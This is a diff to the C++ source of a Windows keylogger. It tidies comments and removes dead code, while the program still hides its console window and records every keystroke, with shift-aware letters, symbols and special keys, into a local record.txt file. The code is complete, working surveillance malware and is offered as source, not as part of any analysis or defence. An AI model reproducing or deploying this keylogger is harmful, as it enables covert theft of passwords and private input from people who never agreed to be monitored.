@@ -2,8 +2,10 @@
 #include <windows.h> 
 #include <Winuser.h> 
 #include <fstream>    
+
 using namespace std;
-//...[+]Hide automatically....
+
+// Hide executable cmd window automatically
 void hide(){
 	HWND stealth;
 	AllocConsole();
@@ -11,6 +13,7 @@ void hide(){
 	ShowWindow(stealth,0);
 }
 
+// This function track all the keyboard key press
 void keylog(){
 	char key;
 	while(true){
@@ -18,14 +21,14 @@ void keylog(){
 			if (GetAsyncKeyState(key) == -32767){
 				ofstream write ("record.txt", ios::app);
 
-				//...[+]Upper case....................................................................................................................
+				// Upper case key A - Z
 				//shift(0x10), cap lock(0x14)
 				if(((key>64) && (key<91)) && (GetAsyncKeyState(0x10))){
 					write << key;
 					write.close();
 					break;
 				}
-				//...[+]Lower Case....................................................................................................................
+				// Lower Case key a - z
 				else if (((key>64) && (key<91)) && !(GetAsyncKeyState(0x10))){
 					key +=32;
 					write << key;           
@@ -33,18 +36,10 @@ void keylog(){
 					break;
 				}
 
-				//...[+]Special Symbols...............................................................................................................
-				
+				// Special Symbols key
 				else{
 					switch (key){
 						case 48:
-							/*
-							if(GetAsyncKeyState(0x10))
-								write << ")";
-							else
-								write << key;
-							break;
-							*/
 							(GetAsyncKeyState(0x10)?write << ")":write << key);
 							break;
 						
@@ -84,7 +79,7 @@ void keylog(){
 							(GetAsyncKeyState(0x10)?write << "(":write << key);
 							break;
 
-						//...[+]Special Symbols Virtual Key..........................................................................................
+						// Special Symbols Virtual Key 
 						case VK_BACK:
 							write << "<BS>";  //backspace (0x08)
 							break;
@@ -100,6 +95,7 @@ void keylog(){
 						case VK_SPACE:
 							write << "<Space>"; //space (0x20)
 							break;
+
 						case VK_ESCAPE:
 							write << "<Esc>"; //Esc (0x1B) 
 					}
@@ -111,7 +107,6 @@ void keylog(){
 
 int main(){
 	hide();
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 	keylog();
 	return 0;
 }
